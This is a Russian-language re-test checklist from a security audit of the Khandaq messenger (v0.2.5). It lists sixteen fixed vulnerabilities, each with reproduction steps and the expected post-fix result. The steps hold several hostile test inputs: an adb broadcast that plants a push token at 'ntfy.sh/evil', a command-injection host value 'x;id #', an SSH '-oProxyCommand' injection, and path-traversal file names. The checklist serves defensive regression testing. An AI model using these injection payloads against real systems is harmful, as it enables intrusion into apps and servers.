# Khandaq — чеклист повторной проверки (post v0.2.5)

Дата фиксов: 2026-06-10  
Базовый коммит: после merge security-fixes в `master`  
APK: https://khandaq.org/downloads/khandaq-android.apk (v0.2.5, build 10295)

## Как проверять

Для каждого пункта: **повторить шаги из исходного аудита** → ожидаемый результат **«закрыто»** или **«не эксплуатируется»**.

---

| # | Уязвимость | Как проверить | Ожидание после фикса |
|---|------------|---------------|----------------------|
| 1 | Перехват push через `MyTokenReceiver` | `adb shell am broadcast -a org.khandaq.messenger.TOKEN_CHANGED -n org.khandaq.messenger/com.zoffcc.applications.trifa.MyTokenReceiver --es token "https://ntfy.sh/evil"` | Broadcast **не принимается** (receiver `exported=false`); token не меняется |
| 2 | IP-утечка через карту | От контакта отправить `khandaq-location:48.85,2.35`, открыть чат на Android | **Нет** автозапроса к `tile.openstreetmap.org`; карта только по тапу |
| 3 | RCE в `check-bootstrap-health.sh` | Node с `host=x;id #` в registry, запустить скрипт | Host **отклонён** regex; `bash -c` не используется |
| 4 | SSH injection в `collect-bootstrap-metrics.sh` | Host `-oProxyCommand=...` в registry | Host **отклонён**; ssh с `-- root@host` |
| 5 | iOS buffer read push | Lossless packet 0xB5 без `\0` от «друга» | **Нет краша**; строка через `initWithBytes:length:` |
| 6 | Открытая push-будилка | POST/GET на `/toxfcm/fcm.php?id=...` без auth (если secret включён) | 401 без `auth`; rate limit 429 при flood; память не растёт |
| 7 | Слабый ключ Android (skip) | Root: prefs `DB_secrect_key` | Ключ в **Keystore** (`DB_secrect_key_enc`), не plaintext |
| 7b | Слабый пароль (новый) | Новая установка с паролем | Salt + PBKDF2 в prefs |
| 8 | iOS path traversal файл | Файл `../../Library/evil` от друга | Сохраняется как `unsafe_filename` в downloads |
| 9 | IOCipherContentProvider | Соседнее app + `content://.../../../` | Provider `exported=false`; path с `..` → error |
| 10 | Слабый push whitelist | Друг шлёт push URL `https://ntfy.sh/attacker` | **Отклонён** `PushUrlValidator` |
| 11 | Desktop markdown hang | Сообщение 20k+ с незакрытым ` ``` ` | UI **не зависает** (лимит 16k / multiline 8k) |
| 12 | Bootstrap без валидации | JSON с invalid host | Не попадает в DB (`BootstrapHostValidator`) |
| 13 | Push 500 на timeout FCM | Симулировать недоступность Google | HTTP **502/503**, не 500 crash loop |
| 14 | Unpinned bootstrap build | `grep TOXCORE_TAG infra/bootstrap/` | Pin `v0.2.20` (или актуальный tag) |
| 15 | nginx без rate limit | Flood push.khandaq.org | **429** от nginx |
| 16 | Predictable nospam | Статический анализ `HelperGeneric.set_new_random_nospam_value` | `SecureRandom` |

## Артефакты для аудитора

| Платформа | Где взять |
|-----------|-----------|
| Android | https://khandaq.org/downloads/khandaq-android.apk |
| iOS | TestFlight (после upload build ≥ post-fix) |
| Desktop | `dist/` после сборки или GitHub Release |
| Push relay | https://push.khandaq.org/health → `auth_required` field |

## Не закрыто полностью (известно)

- Подпись bootstrap JSON (Ed25519) — только host/key validation
- `PUSH_RELAY_AUTH_SECRET` — опционален до настройки на сервере + rebuild клиентов
- iOS `aps-environment`, NotificationService, Windows credentialstore — backlog

## Контакт для отчёта

При нахождении регрессии: номер пункта из таблицы + шаги + logcat/crash report + версия/build.
